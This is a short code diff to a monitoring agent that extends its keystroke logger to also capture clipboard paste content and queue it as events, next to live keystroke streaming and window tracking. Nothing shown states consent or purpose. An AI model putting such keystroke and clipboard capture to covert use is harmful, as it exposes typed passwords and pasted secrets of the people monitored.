@@ -74,9 +74,11 @@ class MonitoringAgent:
         
         # Initialize monitors with event callback
         # Pass live keystroke callback for real-time streaming
+        # Also pass clipboard callback to capture paste content
         self.keystroke_logger = KeystrokeLogger(
             self._on_event,
-            live_keystroke_callback=self._on_live_keystroke
+            live_keystroke_callback=self._on_live_keystroke,
+            clipboard_callback=self._on_event  # Send paste events to queue
         )
         self.window_tracker = WindowTracker(
             self._on_event, 
